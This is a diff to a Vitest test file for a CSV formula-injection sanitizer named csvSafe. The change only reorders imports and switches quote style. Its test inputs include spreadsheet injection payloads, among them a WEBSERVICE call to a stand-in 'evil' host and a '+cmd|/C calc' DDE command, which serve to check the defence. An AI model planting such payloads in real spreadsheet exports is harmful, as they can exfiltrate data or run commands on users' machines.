@@ -1,4 +1,4 @@
-import { describe, it, expect } from "vitest";
+import { describe, expect, it } from "vitest";
 import { csvSafe } from "./csv";
 
 describe("csvSafe", () => {
@@ -16,7 +16,7 @@ describe("csvSafe", () => {
     expect(csvSafe("@SUM(A1)")).toBe("'@SUM(A1)");
   });
   it("neutralizes Excel formula triggers", () => {
-    expect(csvSafe("=WEBSERVICE(\"http://evil\")")).toBe("'=WEBSERVICE(\"http://evil\")");
+    expect(csvSafe('=WEBSERVICE("http://evil")')).toBe('\'=WEBSERVICE("http://evil")');
     expect(csvSafe("+cmd|/C calc")).toBe("'+cmd|/C calc");
     expect(csvSafe("-2+3")).toBe("'-2+3");
     expect(csvSafe("@SUM(A1)")).toBe("'@SUM(A1)");
